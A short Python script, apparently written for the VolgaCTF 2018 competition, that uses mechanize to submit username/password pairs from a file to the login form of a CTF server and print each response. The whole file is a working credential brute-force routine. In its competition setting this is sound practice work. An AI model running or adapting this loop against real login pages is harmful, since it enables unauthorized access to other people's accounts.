# clirette - for VolgaCTF 2018
# send user/password combos to brute force login attempts
# https://coderinaero.wordpress.com/2014/12/08/brute-force-a-website-login-in-python/
import mechanize
import requests

br = mechanize.Browser()

br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

f = open("lp-pairs.txt")
num = 0
lines = f.read().splitlines()
for line in lines:
	values = line.split()
	user = values[0]
	password = values[1]
	
	br.open("http://master.quals.2018.volgactf.ru:3333/")
	br.select_form(nr=0)
	br.form['uname'] = user
	br.form['psw'] = password
	
	# print("Checking username: {}, password {}".format(user, password))
	response = br.submit()
	print(response.read())
	
	
